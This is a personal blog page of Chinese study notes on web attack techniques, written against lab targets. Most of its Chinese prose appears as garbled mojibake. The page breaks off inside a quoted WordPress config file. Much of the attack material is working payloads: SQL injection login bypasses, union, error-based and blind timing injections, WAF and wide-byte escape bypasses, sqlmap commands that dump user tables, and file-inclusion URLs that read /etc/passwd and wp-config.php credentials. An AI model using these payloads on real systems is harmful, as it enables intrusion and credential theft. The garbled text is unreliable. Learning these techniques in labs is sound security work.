<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <title>å®‰å…¨ç¬”è®°--Webæ”»å‡»æŠ€æœ¯</title>
  <meta name="description" content="2 Webæ”»å‡»æŠ€æœ¯2.1 Webæ¼æ´æ¦‚è¿°  OWASP(Opwn Web Application Security Project)          owaspbwa        æ³¨å…¥  å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†          Padding Oracleä¼šè¯ç®¡ç†æ¼æ´ç ”ç©¶ä¸€æ³¢               ...">
  <meta name="author" content="leopardpan">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="å®‰å…¨ç¬”è®°--Webæ”»å‡»æŠ€æœ¯">
  <meta name="twitter:description" content="2 Webæ”»å‡»æŠ€æœ¯2.1 Webæ¼æ´æ¦‚è¿°  OWASP(Opwn Web Application Security Project)          owaspbwa        æ³¨å…¥  å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†          Padding Oracleä¼šè¯ç®¡ç†æ¼æ´ç ”ç©¶ä¸€æ³¢               ...">

  <meta property="og:type" content="article">
  <meta property="og:title" content="å®‰å…¨ç¬”è®°--Webæ”»å‡»æŠ€æœ¯">
  <meta property="og:description" content="2 Webæ”»å‡»æŠ€æœ¯2.1 Webæ¼æ´æ¦‚è¿°  OWASP(Opwn Web Application Security Project)          owaspbwa        æ³¨å…¥  å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†          Padding Oracleä¼šè¯ç®¡ç†æ¼æ´ç ”ç©¶ä¸€æ³¢               ...">

  <link rel="icon" type="image/png" href="images/favicon.png" />
  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet"> -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

  <link rel="canonical" href="http://C0ldstudy.github.io/2017/11/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/">
  <link rel="alternate" type="application/rss+xml" title="Jason Xu" href="http://C0ldstudy.github.io/feed.xml">

  <!-- kramdown-math-katex latex sytax for markdown -->
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous"> -->
  <!-- <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.js" integrity="sha384-9Nhn55MVVN0/4OFx7EE5kpFBPsEMZxKTCnA+4fqDmg12eCTqGi6+BB2LjY8brQxJ" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script> -->


<!-- ç«™ç‚¹ç»Ÿè®¡ -->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<!-- google ç»Ÿè®¡ -->
   
  <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-118980599-1', 'auto');
      ga('send', 'pageview');
  </script>
  

</head>

  <body>
    <span class="mobile btn-mobile-menu">
      <div class="nav_container">
         <nav class="nav-menu-item" style = "float:right">
            <i class="nav-menu-item">
              <a href="/#blog" title="" class="blog-button">
                Homepage
              </a>
            </i>
            
                <i class="nav-menu-item">
                  <a href="/timeline" title="timeline" class="btn-mobile-menu__icon">
                      Timeline
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
                      Tag
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/photography" title="photography" class="btn-mobile-menu__icon">
                      Photography
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/about" title="about" class="btn-mobile-menu__icon">
                      About me
                  </a>
                </i>
            
          </nav>
      </div>
    </span>




    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
  <div class="panel-main">

    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">
        <!-- å¤´åƒæ•ˆæœ-start -->
        <div class="ih-item circle effect right_to_left">
            <a href="/#blog" title="å‰å¾€ Jason Xu çš„ä¸»é¡µ" class="blog-button">
                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
                <div class="info">
                    <div class="info-back">
                        <h2>
                            
                                C0ldstudy
                            
                        </h2>
                        <p>
                           
                                Machine Learning / Security
                            
                        </p>
                    </div>
                </div>
            </a>
        </div>
        <!-- å¤´åƒæ•ˆæœ-end -->
        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for Jason Xu" class="blog-button">Jason Xu</a></h1>
        
        <span class="panel-cover__subtitle panel-subtitle">Personal Station</span>
        
        <hr class="panel-cover__divider" />
        <p class="panel-cover__description">In the end, we only regret the chances we didn't take.</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        
        <p class="panel-cover__description">ğŸ‡¨ğŸ‡³Shanghai -> ğŸ‡­ğŸ‡°Hong Kong -> ğŸ‡ºğŸ‡¸Irvine</p>
        


        <div class="navigation-wrapper">
          <div>
            <nav class="cover-navigation cover-navigation--primary">
              <ul class="navigation">
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">Homepage</a></li>
                
                  <li class="navigation__item"><a href="/timeline" title="timeline">Timeline</a></li>
                
                  <li class="navigation__item"><a href="/tags" title="tags">Tag</a></li>
                
                  <li class="navigation__item"><a href="/photography" title="photography">Photography</a></li>
                
                  <li class="navigation__item"><a href="/about" title="about">About me</a></li>
                
              </ul>
            </nav>
          </div>
        </div>


        </div>
      </div>
    </div>

    
    <div class="panel-cover--overlay cover-clear"></div>
    
  </div>
</header>


    <div class="content-wrapper">
        <div class="content-wrapper__inner">
            


<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
  <header class="post-header">
    <h1 class="post-title">å®‰å…¨ç¬”è®°--Webæ”»å‡»æŠ€æœ¯</h1>
    <div class="post-meta">
      <img src="/images/calendar.png" width="20px"/>
      <time datetime="2017-11-11 00:00:00 -0800" itemprop="datePublished" class="post-meta__date date">2017-11-11 | </time>
      <span id="busuanzi_container_page_pv" style='display:none'> Read: <span id="busuanzi_value_page_pv"></span> Times</span>

    </div>
  </header>

  <section class="post">

    <h3 id="2-webæ”»å‡»æŠ€æœ¯">2 Webæ”»å‡»æŠ€æœ¯</h3>
<h4 id="21-webæ¼æ´æ¦‚è¿°">2.1 Webæ¼æ´æ¦‚è¿°</h4>

<ul>
  <li>OWASP(Opwn Web Application Security Project)
    <ul>
      <li>owaspbwa</li>
    </ul>
  </li>
  <li>æ³¨å…¥</li>
  <li>å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†
    <ul>
      <li>Padding Oracleä¼šè¯ç®¡ç†æ¼æ´<strong><em>ç ”ç©¶ä¸€æ³¢</em></strong>
        <ul>
          <li>å¯¹ç§°åŠ å¯† + CBC</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰</li>
  <li>å¤±æ•ˆçš„è®¿é—®æ§åˆ¶</li>
  <li>æ•æ„Ÿä¿¡æ¯æ³„éœ²</li>
  <li>æ”»å‡»æ£€æµ‹é˜²èŒƒå’Œä¸è¶³</li>
  <li>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSFRï¼‰</li>
</ul>

<h4 id="22-webæœåŠ¡å™¨çš„æ¢æµ‹">2.2 WebæœåŠ¡å™¨çš„æ¢æµ‹</h4>

<ul>
  <li>WAFæ¢æµ‹web application firewall
    <ul>
      <li>nmapçš„wafæ¢æµ‹è„šæœ¬
        <ul>
          <li>nmap -p 80 â€“script http-waf-detect.nse www.xxx.com</li>
        </ul>
      </li>
      <li>wafw00f
        <ul>
          <li>waf00f www.xxx.com</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>WebæœåŠ¡å™¨è´Ÿè½½å‡è¡¡æ¢æµ‹
    <ul>
      <li>CDNï¼ˆcontent distribution networkï¼‰å†…å®¹åˆ†å‘ç½‘ç«™</li>
      <li>Cloudflare ä¸€å°æœåŠ¡å™¨æ•°æ®ä¼ åˆ°CDNå‚å•†çš„å„ä¸ªèŠ‚ç‚¹ï¼Œç”¨æˆ·è®¿é—®å„ä¸ªCloudflareèŠ‚ç‚¹</li>
      <li>lbd www.xxx.com	è´Ÿè½½å‡è¡¡æ¢æµ‹</li>
    </ul>
  </li>
  <li>Webé¡µé¢çˆ¬å–
    <ul>
      <li>Dirbuster ç½‘ç«™ç›®å½•å’Œæ–‡ä»¶çš„éå†å’ŒçŒœè§£
        <ul>
          <li>å­—å…¸ä½ç½®ï¼š /usr/share/dirbuster/wordlists/</li>
        </ul>
      </li>
      <li>httrackç½‘ç«™é•œåƒ/å…‹éš†</li>
      <li>vbscan		æ¢æµ‹vBulletinåŠå…¶æ¼æ´</li>
      <li>vane/wpscan æ¢æµ‹WordpressåŠå…¶æ¼æ´</li>
      <li>joomscan æ¢æµ‹joomlaåŠå…¶æ¼æ´</li>
    </ul>
  </li>
</ul>

<h4 id="23-é’ˆå¯¹webè„šæœ¬çš„æ”»å‡»">2.3 é’ˆå¯¹Webè„šæœ¬çš„æ”»å‡»</h4>

<ul>
  <li>SQLæ³¨å…¥æ¼æ´æ”»å‡»
    <ul>
      <li>Bricks
        <ul>
          <li>ç¬¬ä¸€é¢˜
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'='1</code></li>
              <li><code class="language-plaintext highlighter-rouge">'or'1</code></li>
              <li>å¦‚æœä¸èƒ½è¾“å…¥å•å¼•å·
                <ul>
                  <li>ç”¨æˆ·åï¼š\</li>
                  <li>å¯†ç ï¼š<code class="language-plaintext highlighter-rouge"> or 1#</code></li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ç¬¬äºŒé¢˜ï¼ˆjsæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œjså¤šäº†ä¸€é“æ£€æµ‹è¾“å…¥ç‰¹æ®Šå­—ç¬¦çš„å‡½æ•°ï¼Œéœ€è¦ç»•è¿‡ï¼‰
            <ul>
              <li>function onSubmitOfLoginForm(â€¦)</li>
              <li>1.è¦†ç›–åŸå‡½æ•°(æ£€æŸ¥-console-å¯ä»¥è¦†ç›–åŸå…ˆçš„å‡½æ•°)
                <ul>
                  <li>function onSubmitOfLoginForm (){ return true;}</li>
                </ul>
              </li>
              <li>2.å®šä¹‰å‡½æ•°æ°¸è¿œè¿”å›true</li>
              <li>3.è¾“å…¥ä¸‡èƒ½å¯†ç å³å¯</li>
              <li>4.ç¦ç”¨jsä¸­çš„æ‰§è¡Œ</li>
            </ul>
          </li>
          <li>ç¬¬ä¸‰é¢˜
            <ul>
              <li><code class="language-plaintext highlighter-rouge">1')or('1=1</code></li>
              <li><code class="language-plaintext highlighter-rouge">SELECT * FROM users WHERE name=('1')or('1=1') and password=('1')or('1=1') LIMIT 0,1</code></li>
            </ul>
          </li>
          <li>ç¬¬å››é¢˜
            <ul>
              <li>åŒå¼•å·</li>
            </ul>
          </li>
          <li>ç¬¬äº”é¢˜
            <ul>
              <li><code class="language-plaintext highlighter-rouge">'or'1'#</code> or <code class="language-plaintext highlighter-rouge">'or'1'-- </code></li>
              <li><code class="language-plaintext highlighter-rouge">#</code>æ³¨é‡Šä¹‹åçš„sqlè¯­å¥</li>
              <li>å¾®è½¯æ•°æ®åº“æ³¨é‡Šç¬¦ <code class="language-plaintext highlighter-rouge">--</code> + <code class="language-plaintext highlighter-rouge">ç©ºæ ¼</code></li>
              <li>md5æ•£åˆ—ï¼ˆ128bit 16byte 32asciiå­—ç¬¦ï¼‰</li>
              <li>sha1ï¼ˆ160bit 20byte 40asciiï¼‰</li>
              <li>sha256ï¼ˆ256bit 32byte 64asciiï¼‰</li>
            </ul>
          </li>
          <li>http://www.wechall.net/ é¢˜åº“</li>
          <li>ç¬¬å…­é¢˜
            <ul>
              <li>é‡å®šå‘</li>
            </ul>
          </li>
          <li>ç¬¬ä¸ƒé¢˜
            <ul>
              <li>å…ˆåŒ¹é…ç”¨æˆ·åï¼Œåœ¨æŸ¥è¯¢æ¯”å¯¹å¯†ç </li>
              <li>ç”¨æˆ·åï¼š<code class="language-plaintext highlighter-rouge">'and 0 union select md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1')#</code></li>
              <li>å¯†ç ï¼š1</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>mysqlå¸¸ç”¨è¯­å¥
        <ul>
          <li>select version();</li>
          <li>select database();</li>
          <li>select user();</li>
          <li>show databases;</li>
          <li>use mysql;</li>
          <li>show tables;</li>
          <li>desc user;	//æè¿°userè¡¨</li>
          <li>select Host,User,Password from user;</li>
          <li>select Host,User,Password from user where User=â€™rootâ€™ and 1;</li>
          <li>select Host,User,Password from user where User=â€™rootâ€™ and 0 union select 1,2,3;   //è®©å·¦è¾¹è®°å½•ä¸ºç©ºï¼Œæ§åˆ¶å³è¾¹çš„è¿”å›å€¼</li>
          <li>select Host,User,Password from user where User=â€™â€™ and 0 union select 1,2,md5(â€˜1â€™);
            <ul>
              <li>ç”¨æˆ·åä¸sqlè¯­å¥åˆå¹¶ï¼Œè®©åŸæœ¬sqlè¯­å¥ä¸º0ï¼Œç”¨selectè¯­å¥ä½¿æ¯ä¸€åˆ—éƒ½æ˜¯md5(â€˜1â€™)çš„å€¼ï¼Œç„¶ååœ¨å¯†ç è¾“å…¥1ï¼Œå³å¯åŒ¹é…ï¼Œç™»å½•æˆåŠŸã€‚</li>
              <li>å…ˆåšandå†åšor</li>
              <li>åº“åè¡¨ååŒºåˆ†å¤§å°å†™ï¼Œåˆ—åä¸åŒºåˆ†å¤§å°å†™</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>wordpressé¶æœºæ¼æ´
    <ul>
      <li>wpscan â€“url http://192.168.80.240/wordpress â€“ enumerate p</li>
      <li>/vane/vane.rb â€“url http://192.168.80.240/wordpress â€“enumerate p
        <ul>
          <li>data/plugins.txt</li>
        </ul>
      </li>
      <li>select * from xxx where ss_id=1 and 0 union select 1,version(),user(),database()#</li>
      <li>%27-&gt;<code class="language-plaintext highlighter-rouge">'</code>,%25-&gt;<code class="language-plaintext highlighter-rouge">%</code>,%5C-&gt;<code class="language-plaintext highlighter-rouge">\</code></li>
      <li>éªŒè¯æ˜¯å¦å­˜åœ¨æ¼æ´ï¼šhttp://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 1=2</li>
      <li>ä½¿ç”¨union selectè”åˆæ’æŸ¥è¯¢ï¼šhttp://192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 0 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA=0x776F72647072657373 group by TABLE_SCHEMA #</li>
      <li>group_concat æŠŠç›¸åŒçš„è¡Œå½’å¹¶åœ¨ä¸€èµ·</li>
    </ul>
  </li>
  <li>msyqlåŸè¡¨æ³¨å…¥è·å–ä¿¡æ¯çš„æ–¹æ³•ï¼ˆæ— æ³•è·å¾—è¡¨çš„åå­—ç­‰ç›¸å…³ä¿¡æ¯ï¼‰
    <ul>
      <li>åšä¸€ä¸ªæµ‹è¯•ï¼Œæ–°å»ºä¸€ä¸ªuserè¡¨
        <ul>
          <li>create schema Test;</li>
          <li>use Test;</li>
          <li>create table users (id INT, username, password);</li>
          <li>insert into users values (1, â€˜adminâ€™);</li>
          <li>select * from users;</li>
        </ul>
      </li>
      <li>é€šè¿‡use information_schema;è·å¾—æ•°æ®åº“æ‰€æœ‰è¡¨å
        <ul>
          <li>tables åŒ…å«æ‰€æœ‰è¡¨åï¼›</li>
          <li>columns åŒ…å«æ‰€æœ‰å­—æ®µå</li>
          <li>select 1,2 from dual where 0 union select TABLE_SCHEMA,group_contat(TABLE_NAME) TABLE_NAME from information_schema, TABLES  where TABLE_SCHEMA=â€™Testâ€™ LIMIT 1; //è·å–Testæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨å</li>
          <li>select databse(); //è·å–å½“å‰æ•°æ®åº“åå­—</li>
          <li>select Host,User,Passoword from user \G;</li>
          <li>hex(â€˜wordpressâ€™); //776F72647072657373</li>
          <li>select 776F72647072657373;</li>
        </ul>
      </li>
      <li>åªé€‚ç”¨äºmysqlçš„æŠ¥é”™æ³•
        <ul>
          <li>select * form user where 0 and extractvalue(1,version());</li>
          <li><code class="language-plaintext highlighter-rouge">/*!00000 payload */</code></li>
          <li>è·å–æ–‡ä»¶å†…å®¹ï¼šhttp://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=1 and 1=0 union select 1,hex(load_file(â€˜/var/www/wordpress/wp-config.phpâ€™)),3,4â€“</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>ç›²æ³¨sqlæ³¨å…¥æ–¹æ³•
    <ul>
      <li>union select</li>
      <li>error-based</li>
      <li>time-based blind</li>
      <li>çŒœè§£æ³•-&gt;äºŒåˆ†æŠ˜åŠçŒœè§£æ³•(boolean-based blind)
        <ul>
          <li>éœ€è¦å…ˆåˆ¤æ–­å˜é‡é•¿åº¦len()</li>
          <li>192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 +
            <ul>
              <li>and ascii(substr((select user() from wp_users limit 0,1),1,1))&gt;128 //é€šè¿‡åˆ¤æ–­ç½‘é¡µæ˜¯å¦å˜åŒ–ç¡®å®šçŒœæµ‹æ˜¯å¦æ­£ç¡®</li>
              <li>and ascii(substr((select user()),1,1))=119 //userå˜é‡ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯w</li>
              <li>æœç´¢userä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦asciiåº”è¯¥åœ¨0-255ä¹‹å‰ï¼Œä¸€ä¸ªä¸€ä¸ªå°è¯•</li>
              <li>æ‰¾åˆ°å¯¹åº”æ–¹æ³•ï¼Œä½¿ç”¨ord(â€˜aâ€™)æˆ–è€…chr(111)</li>
              <li>æ–¹æ³•äºŒ:å¦‚æœä¸èƒ½ç›´æ¥æŸ¥çœ‹ç½‘é¡µå˜åŒ–ï¼Œå¯ä»¥é€šè¿‡æ˜¯å¦è¶…è¿‡5ç§’æ¥åˆ¤æ–­æ˜¯å¦ç¬¦åˆæ ‡å‡†
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;128,1,sleep(5))# //ifç¬¬ä¸€ä¸ªå‚æ•°æ˜¯trueï¼Œç›´æ¥æ‰§è¡Œï¼Œè‹¥æ˜¯falseï¼Œè°ƒç”¨sleep</li>
                </ul>
              </li>
              <li>æ–¹æ³•ä¸‰ï¼šä»é¡µé¢è¿”å›æ—¶é—´åˆ¤æ–­æ˜¯å¦å®Œæˆ,benchmark()æ€§èƒ½åˆ¤æ–­å‡½æ•°
                <ul>
                  <li>and if(ascii(substr((select user()),1,1))&gt;118,1,benchmark(1000000,md5(0x20)))</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>sqlæ³¨å…¥å·¥å…·
    <ul>
      <li>Pangolin</li>
      <li>Hacij</li>
      <li>Safe3</li>
      <li>å•ŠD</li>
      <li>SQLmap
        <ul>
          <li>sqlmap â€“url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 â€“fingerprint  //åˆ¤æ–­è¿™ä¸ªurlå¯ä»¥ç”¨å“ªäº›æ–¹å¼å®ç°æ³¨å…¥
            <ul>
              <li>$_GET[â€˜idâ€™]</li>
              <li>$_POST[â€˜idâ€™]</li>
              <li>$_COOKIE[â€˜idâ€™]</li>
              <li>request.get</li>
              <li>request.form</li>
              <li>request.cookie</li>
              <li>request</li>
            </ul>
          </li>
          <li>sqlmap â€“url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 â€“dbs //è·å–æ•°æ®åº“åˆ—è¡¨</li>
          <li>sqlmap â€“url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress â€“tables //è·å–wordpressåº“ä¸­æ‰€æœ‰è¡¨</li>
          <li>sqlmap â€“url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users â€“column //è·å¾—è¡¨ä¸­çš„æ‰€æœ‰åˆ—</li>
          <li>sqlmap â€“url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users -C user_login,user_pass â€“dump //è·å–åˆ—ä¸­æŒ‡å®šæ•°æ®ï¼Œå¯¼å‡ºæ•°æ®</li>
          <li>â€“count //è·å–æ•°æ®æ•°é‡</li>
          <li>â€“start=1 â€“stop=5 //è·å–éƒ¨åˆ†çš„æ•°æ®</li>
          <li>-tamper xxx.py //è£…è½½æŒ‡å®špayload</li>
          <li>sqlmap â€“purge-output		//æ¸…é™¤ç¼“å­˜
            <ul>
              <li>æ•°æ®ç¼“å­˜åœ¨/root/.sqlmap/output/<ip></ip></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>ç»•è¿‡WAF
        <ul>
          <li>%09(tabé”®)ä»£æ›¿ç©ºæ ¼</li>
          <li>%0aï¼ˆæ¢è¡Œï¼‰%0d(å›è½¦)ä»£æ›¿ç©ºæ ¼</li>
          <li>ä½¿ç”¨æ‹¬å·</li>
          <li>å¯ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">/*!00000user()*/</code>åœ¨æ³¨é‡Šä¸­å®ç°è¿è¡Œè¯­å¥</li>
        </ul>
      </li>
      <li>
        <p>POSTæ–¹å¼</p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  POST /login.php HTTP/1.1
  host:xxx
  User-agent:xxx
  Accept:...
  Content-type:...
  Content-length: 30 
</code></pre></div>        </div>

        <ul>
          <li>username=xxx&amp;password=123456</li>
          <li>ä½¿ç”¨ç«ç‹temper dataæ’ä»¶</li>
          <li>æ³¨å…¥æ—¶æ˜¯è¯·æ±‚æ•°æ®åŒ…æŠ•å‘çš„urlåœ°å€</li>
          <li>sqlmap -u â€œhttp://172.16.185.185/WackoPicko/users/login.phpâ€ â€“data=â€username=tt&amp;password=123456â€ -p username â€“fingerprint</li>
          <li>sqlmap -u â€œhttp://172.16.185.185/WackoPicko/users/login.phpâ€ â€“data=â€username=tt&amp;password=123456â€ -p username â€“dbs</li>
          <li>sqlmap -u â€œhttp://172.16.185.185/WackoPicko/users/login.phpâ€ â€“data=â€username=test&amp;password=123456â€ -p username -D wackopicko â€“tables
   	* sqlmap -u â€œhttp://172.16.185.185/WackoPicko/users/login.phpâ€ â€“data=â€username=test&amp;password=123456â€ -p username -D wackopicko -T users â€“columns
   	* sqlmap -u â€œhttp://172.16.185.185/WackoPicko/users/login.phpâ€ â€“data=â€username=test&amp;password=123456â€ -p username -D wackopicko -T users -C id,login,password â€“dump</li>
        </ul>
      </li>
      <li>å®½å­—ç¬¦ç¼–ç ç»•è¿‡
        <ul>
          <li>phpçš„addslashå‡½æ•°ä½¿å¾—<code class="language-plaintext highlighter-rouge">'</code>å˜ä¸º<code class="language-plaintext highlighter-rouge">\'</code>ï¼Œåœ¨GBKç¼–ç ä¸­ï¼Œè‹¥ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äº%80åˆ™é»˜è®¤ä¸ºåŒå­—ç¬¦ï¼Œä½¿ç”¨%81%27ï¼Œç”±äºaddslashä½¿å¾—å˜ä¸º%81%5c%27ï¼Œè€Œ%81%5cåˆ™æˆä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œä»è€Œä½¿å¾—å•å¼•å·é¿å…è¢«è½¬ä¹‰</li>
          <li>http://172.16.1.180/index.php?id=1</li>
          <li>sqlmap ä½¿ç”¨GETæ–¹æ³•</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h4 id="24-æ–‡ä»¶åŒ…å«æ¼æ´æ”»å‡»">2.4 æ–‡ä»¶åŒ…å«æ¼æ´æ”»å‡»</h4>
<ul>
  <li>å®šä¹‰ï¼šæœåŠ¡å™¨é€šè¿‡è„šæœ¬ä»£ç åœ¨åŒ…å«æ–‡ä»¶çš„æ—¶å€™è¿‡æ»¤ä¸ä¸¥ï¼Œä»è€Œæ³¨å…¥ä¸€æ®µæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶çš„ä»£ç ã€‚
    <ul>
      <li>â€œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´â€ï¼Œ å³Local File Inclusion, LFIã€‚</li>
      <li>å¦‚æœPHPçš„é…ç½®é€‰é¡¹ä¸ºâ€œall_url_includeâ€çš„è¯ï¼Œåˆ™include/requireå‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºâ€œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´â€ï¼Œå³Remote File Inclusion, RFIã€‚</li>
    </ul>
  </li>
  <li>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´
    <ul>
      <li>wpscan</li>
      <li>vane</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=/etc/passwd%00</li>
      <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php%00</li>
      <li>åœ¨Firefoxæµè§ˆå™¨ä¸­è®¾ç½®æœ¬åœ°ä»£ç†ï¼Œç”¨ncç›‘å¬ä¼ é€’çš„æ•°æ®åŒ…</li>
      <li>
        <p>æŠŠå¾—åˆ°çš„å­—ç¬¦ä¸²ä½¿ç”¨HackBaré€šè¿‡Base64è§£ç <code class="language-plaintext highlighter-rouge">PD9waHANCi8vICoqIE15U1FMIHNldHRpbmdzICoqIC8vDQpkZWZpbmUoJ0RCX05BTUUnLCAnd29yZHByZXNzJyk7ICAgIC8vIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZQ0KZGVmaW5lKCdEQl9VU0VSJywgJ3dvcmRwcmVzcycpOyAgICAgLy8gWW91ciBNeVNRTCB1c2VybmFtZQ0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICd3b3JkcHJlc3MnKTsgLy8gLi4uYW5kIHBhc3N3b3JkDQpkZWZpbmUoJ0RCX0hPU1QnLCAnbG9jYWxob3N0Jyk7ICAgIC8vIDk5JSBjaGFuY2UgeW91IHdvbid0IG5lZWQgdG8gY2hhbmdlIHRoaXMgdmFsdWUNCg0KLy8gWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2ggYSB1bmlxdWUgcHJlZml4DQokdGFibGVfcHJlZml4ICA9ICd3cF8nOyAgIC8vIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCg0KLy8gQ2hhbmdlIHRoaXMgdG8gbG9jYWxpemUgV29yZFByZXNzLiAgQSBjb3JyZXNwb25kaW5nIE1PIGZpbGUgZm9yIHRoZQ0KLy8gY2hvc2VuIGxhbmd1YWdlIG11c3QgYmUgaW5zdGFsbGVkIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcy4NCi8vIEZvciBleGFtcGxlLCBpbnN0YWxsIGRlLm1vIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcyBhbmQgc2V0IFdQTEFORyB0byAnZGUnDQovLyB0byBlbmFibGUgR2VybWFuIGxhbmd1YWdlIHN1cHBvcnQuDQpkZWZpbmUgKCdXUExBTkcnLCAnJyk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCmRlZmluZSgnQUJTUEFUSCcsIGRpcm5hbWUoX19GSUxFX18pLicvJyk7DQpyZXF1aXJlX29uY2UoQUJTUEFUSC4nd3Atc2V0dGluZ3MucGhwJyk7DQoNCmRlZmluZSgnUkVMT0NBVEUnLHRydWUpOw0KPz4=&lt;?php</code></p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>          // ** MySQL settings ** //
          define('DB_NAME', 'wordpress');    // The name of the database
          define('DB_USER', 'wordpress');     // Your MySQL username
          define('DB_PASSWORD', 'wordpress'); // ...and password
          define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value

          // You can have multiple installations in one database if you give each a unique prefix 
          $table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!
          // Change this to localize WordPress.  A corresponding MO file for the	
